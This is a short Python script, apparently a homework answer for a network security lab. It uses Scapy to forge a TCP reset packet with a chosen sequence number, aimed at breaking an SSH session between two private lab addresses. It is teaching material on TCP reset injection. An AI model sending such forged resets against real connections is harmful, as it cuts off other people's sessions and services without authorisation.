#!/usr/bin/python
# Homework 5, Task 4: Breaking SSH Connection Using Scapy

from scapy.all import *

ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=39868, dport=22, seq=3269239789, flags="R")
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)

